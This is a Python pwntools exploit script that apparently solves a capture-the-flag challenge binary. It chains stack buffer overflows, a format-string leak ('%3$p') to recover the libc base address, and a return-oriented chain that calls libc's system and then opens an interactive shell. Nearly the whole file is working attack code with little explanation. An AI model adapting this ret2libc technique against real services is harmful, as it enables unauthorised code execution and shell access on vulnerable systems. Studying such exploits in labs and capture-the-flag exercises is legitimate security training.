#!/usr/bin/python3
from pwn import *

context.arch = 'amd64'
exe = './src/chall'

if args.REMOTE:
    p = remote('localhost', 9999)   
else:
    p = process(exe)



context.terminal = ['tmux', 'splitw', '-h']
l = context.binary = ELF(exe, checksec=False)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
gadget = lambda x: p64(next(libc.search(asm(x, os='linux', arch=libc.arch))))


p.sendline(b'0')
sleep(0.1)
p.sendline(b'docker can go and kill itself')
sleep(0.1)


payload = b'A' * (0xa + 8)
payload += p64(0x40101a)
payload += p64(l.plt['perror'])
payload += p64(0x40101a)
payload += p64(l.symbols['main'])



p.sendline(payload)

sleep(0.1)

p.sendline(b'-96')
sleep(0.1)
p.send(p16(1776))
sleep(0.1)

payload = b'B' * (0xa + 8)
payload += p64(0x40101a)
payload += p64(l.symbols['main'])

p.sendline(payload)
sleep(0.1)


p.sendline(b'8')
sleep(0.1)
p.sendline(b'%3$p')
sleep(0.1)

payload = b'C' * (0xa + 8)
payload += p64(0x000000000040119a)
payload += p64(l.symbols['message']+8)
payload += p64(0x40101a)
payload += p64(l.symbols['perror'])
payload += p64(0x40101a)
payload += p64(l.symbols['main'])


p.sendline(payload)
sleep(0.1)

p.recvline()
libc.address = (int(p.recvline().strip(), 16) - 370) - 0x114670
print(hex(libc.address))

p.sendline(b'0')
sleep(0.1)
p.sendline(b'krish')
sleep(0.1)


payload = b'D' * (0xa + 8)
payload += p64(0x000000000040119a)
payload += p64(libc.address + 0x1d8678)
payload += p64(0x40101a)
payload += p64(libc.symbols['system'])

p.sendline(payload)

p.interactive()